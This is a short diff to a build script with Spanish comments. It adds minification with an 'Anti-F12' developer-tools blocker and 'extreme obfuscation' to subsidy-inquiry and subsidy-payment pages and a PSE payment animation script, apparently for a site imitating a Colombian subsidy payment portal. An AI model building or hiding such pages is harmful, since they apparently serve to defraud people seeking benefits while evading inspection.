@@ -180,7 +180,9 @@ async function main() {
     console.log('\n🔒 INICIANDO OFUSCACIÓN EXTREMA...\n');
 
     // 1. Minificar HTML y meterle el Anti-F12
+    await minificarHTML(CARPETA_BUCARAMANGA, 'consultadesubsidio.html'); 
     await minificarHTML(CARPETA_BUCARAMANGA, 'pagodesubsidio.html'); 
+    await minificarHTML(CARPETA_BUCARAMANGA, 'index.html'); 
 
     // 2. Ofuscar TODO el JavaScript (El pse y el app.js)
     ofuscarJS(CARPETA_BUCARAMANGA, 'pse-animacion.js');
